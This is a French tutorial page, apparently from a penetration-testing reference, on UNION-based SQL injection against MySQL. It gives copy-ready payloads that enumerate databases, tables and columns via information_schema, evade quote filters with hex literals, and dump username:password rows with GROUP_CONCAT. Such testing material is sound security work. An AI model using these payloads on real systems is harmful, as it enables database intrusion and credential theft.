---
title: "Extraire des données MySQL via information_schema avec UNION"
description: "Parcourir le catalogue MySQL avec UNION SELECT : lister les bases, les tables et les colonnes depuis information_schema, puis récupérer les lignes avec GROUP_CONCAT."
keywords:
  - information_schema
  - extraction UNION SELECT
  - GROUP_CONCAT
  - énumération des tables MySQL
  - énumération des colonnes
---

# Extraction via information_schema

Une fois le nombre de colonnes connu et une position de chaîne reflétée trouvée, `information_schema` donne une carte complète du serveur, et `GROUP_CONCAT()` tasse de nombreuses lignes dans la seule cellule reflétée. Les exemples ci-dessous supposent une requête à trois colonnes dont la deuxième est reflétée.

Lister les bases de données :

```sql
' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata-- 
```

Lister les tables de la base de données courante :

```sql
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- 
```

Lister les colonnes d'une table cible. Mettre le nom de la table entre guillemets est souvent filtré, passez-le donc sous forme de littéral hexadécimal (`users` vaut `0x7573657273`), qui ne nécessite pas de guillemets :

```sql
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name=0x7573657273 AND table_schema=database()-- 
```

Le filtre `table_schema=database()` a son importance : sans lui, une table `users` présente dans plusieurs schémas visibles fusionnerait leurs colonnes, et des noms d'un autre schéma peuvent ne pas exister sur la table de la base de données courante.

Récupérer les lignes. Séparez les champs par un délimiteur hexadécimal pour que la sortie concaténée reste lisible, par exemple `0x3a` pour un deux-points :

```sql
' UNION SELECT NULL,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL FROM users-- 
```

`GROUP_CONCAT` tronque à `group_concat_max_len` (1024 octets par défaut). Lorsqu'une table est plus grande que cela, augmentez la limite si le compte le permet avec `SET SESSION group_concat_max_len=1000000`, ou paginez les lignes avec `LIMIT offset,1` et lisez-les une par une.

## Outils

- **sqlmap** : extraction union automatisée parcourant information_schema.
- **mysql** : client officiel pour confirmer directement les requêtes de catalogue.

## Références

- MySQL Reference Manual : `information_schema` tables, GROUP_CONCAT, group_concat_max_len
- OWASP Testing Guide : Testing for SQL Injection
